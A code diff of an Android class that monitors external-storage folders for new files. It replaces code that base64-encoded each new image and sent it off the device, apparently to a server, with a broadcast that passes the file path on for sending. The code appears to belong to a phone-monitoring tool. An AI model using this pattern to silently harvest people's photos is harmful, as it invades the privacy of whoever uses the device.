@@ -1,20 +1,13 @@
 package custom.fileobserver;
 
 import java.io.File;
-import java.io.IOException;
 import java.util.ArrayList;
 
-import org.apache.commons.io.FileUtils;
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.content.Context;
+import android.content.Intent;
 import android.os.Environment;
 import android.util.Log;
 
-import com.inet.android.request.DataRequest;
-import com.inet.android.request.FileRequest;
-import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 /**
@@ -26,25 +19,27 @@ import com.inet.android.utils.Logging;
  */
 public class SetStateImage {
 
-	private static final String LOG_TAG = "monitorMediaFiles";
+	private static final String LOG_TAG = SetStateImage.class.getSimpleName()
+			.toString();
 	private FileWatcher mWatcher = null;
-	private final String TAG = "GetImage";
 	private static SetStateImage instance;
 	private static boolean state = false;
 	protected static Context mContext;
-	private ConvertDate date = null;
-	private String time;
-	private String imageTypeStr = "21";
 
 	public static SetStateImage getInstance(Context ctx) {
 		SetStateImage localInstance = instance;
 		mContext = ctx;
-		Logging.doLog(LOG_TAG, "Context= " + mContext.toString());
+
+		Logging.doLog(LOG_TAG, "Context= " + mContext.toString(), "Context= "
+				+ mContext.toString());
+
 		if (localInstance == null) {
 			synchronized (SetStateImage.class) {
 				localInstance = instance;
 				if (localInstance == null) {
-					Logging.doLog(LOG_TAG, "localInstance = null");
+					Logging.doLog(LOG_TAG, "localInstance = null",
+							"localInstance = null");
+
 					instance = localInstance = new SetStateImage();
 				}
 			}
@@ -59,9 +54,10 @@ public class SetStateImage {
 	/*
 	 * Start monitoring the creation of files in memory
 	 */
-	public void StartWatcher() {
+	public void startWatcher() {
+		Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
+
 		state = true;
-		date = new ConvertDate();
 
 		String sdcard = Environment.getExternalStorageDirectory()
 				.getAbsolutePath();
@@ -81,74 +77,61 @@ public class SetStateImage {
 			File file = new File(item);
 			if (file.exists() && file.isDirectory()) {
 
-				Logging.doLog(LOG_TAG, "FileWatcher = create" + item);
-				mWatcher = new FileWatcher(item, true, FileWatcher.CREATE);
-				Logging.doLog(LOG_TAG, "FileListener");
+				Logging.doLog(LOG_TAG, "FileWatcher = create " + item,
+						"FileWatcher = create" + item);
+				mWatcher = new FileWatcher(item, true, FileWatcher.FILE_CHANGED);
+				Logging.doLog(LOG_TAG, "FileListener", "FileListener");
 
 				mWatcher.setFileListener(mFileListener);
-				Logging.doLog(LOG_TAG, "startWatcher");
+				Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
 				mWatcher.startWatching();
 			}
 		}
 
 	}
 
+	private static String FILE_REQUEST = "com.inet.android.media.FILE";
+	private static final int ID_ACTION_SEND = 1;
+
 	FileListener mFileListener = new FileListener() {
 
 		@Override
 		public void onFileCreated(String path) {
-			Log.i(TAG, "onFileCreated " + path);
-			String sendJSONStr = null;
-			JSONObject object = new JSONObject();
-			ConvertDate getDate = new ConvertDate();
-			try {
-				object.put("time", getDate.logTime());
-				object.put("type", imageTypeStr);
-				object.put("path", path);
-				object.put("image", encodeFileToBase64Binary(path));
+			Logging.doLog(LOG_TAG, "onFileCreated " + path, "onFileCreated "
+					+ path);
 
-				// sendJSONStr = jsonObject.toString();
-				sendJSONStr = object.toString();
-			} catch (JSONException e) {
-				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-			DataRequest file = new DataRequest(mContext);
-			file.sendRequest(sendJSONStr); // добавить строку request
+			// Sending file request broadcast message
+			
 		}
 
 		@Override
 		public void onFileDeleted(String path) {
-			Log.i(TAG, "onFileDeleted " + path);
+			Log.i(LOG_TAG, "onFileDeleted " + path);
 		}
 
 		@Override
 		public void onFileModified(String path) {
-			Log.i(TAG, "onFileModified " + path);
+			Log.i(LOG_TAG, "onFileModified " + path);
 		}
 
 		@Override
 		public void onFileRenamed(String oldName, String newName) {
-			Log.i(TAG, "onFileRenamed from: " + oldName + " to: " + newName);
+			Log.i(LOG_TAG, "onFileRenamed from: " + oldName + " to: " + newName);
+		}
+
+		@Override
+		public void onFileCloseWrite(String path) {
+			// TODO Auto-generated method stub
+			Log.i(LOG_TAG, "onFileCloseWrite");
+			Intent intent = new Intent(FILE_REQUEST);
+			intent.putExtra("type", ID_ACTION_SEND);
+			intent.putExtra("path", path);
+			mContext.sendBroadcast(intent);
 		}
 
 	};
 
-	/*
-	 * Stop monitoring the creation of files in memory
-	 */
-	private String encodeFileToBase64Binary(String fileName) throws IOException {
-
-		File file = new File(fileName);
-		byte[] bytes = FileUtils.readFileToByteArray(file);
-		String encoded = android.util.Base64.encodeToString(bytes, 0);
-		bytes = null;
-		return encoded;
-	}
-
-	public void StopWatcher() {
+	public void stopWatcher() {
 		state = false;
 		if (mWatcher != null)
 			mWatcher.stopWatching();
